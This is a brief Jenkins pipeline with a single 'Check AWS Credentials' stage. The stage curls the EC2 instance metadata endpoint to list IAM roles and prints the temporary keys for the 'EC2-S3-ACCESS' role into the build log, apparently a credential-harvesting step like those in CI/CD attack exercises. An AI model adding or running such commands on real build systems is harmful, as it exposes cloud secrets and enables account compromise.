pipeline {
    agent any

    stages {
        stage('Check AWS Credentials') {
            steps {
                script {
                    sh 'echo "AWS Credentials from Instance Metadata Service:"'
                    sh 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'
                    sh 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3-ACCESS'
                }
            }
        }
    }
}
